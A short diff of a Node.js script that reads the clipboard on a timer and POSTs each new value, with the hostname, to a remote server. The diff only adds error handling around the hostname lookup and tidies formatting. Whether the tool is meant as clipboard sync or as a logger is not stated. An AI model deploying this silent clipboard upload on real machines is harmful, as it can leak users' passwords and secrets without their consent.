@@ -1,10 +1,14 @@
 import clipboardy from 'clipboardy';
 import request from 'request';
-var os = require("os");
-var hostname = os.hostname();
-
+var hostname = "";
+try {
+    var os = require("os");
+    hostname = os.hostname();
+} catch (error) {
+    // console.log(error);
+}
 async function main() {
-    var prevData = ""
+    var prevData = "";
     setInterval(async () => {
         const text = await clipboardy.read();
         if (prevData == text || text == "" || text === " ") {
@@ -14,7 +18,7 @@ async function main() {
             request({
                 url: "http://testlink.techietrix.com/clipboard/saveclipboard",
                 method: "POST",
-                json: true, 
+                json: true,
                 body: myJSONObject
             }, function (error, response, body) {
                 // console.log(response);
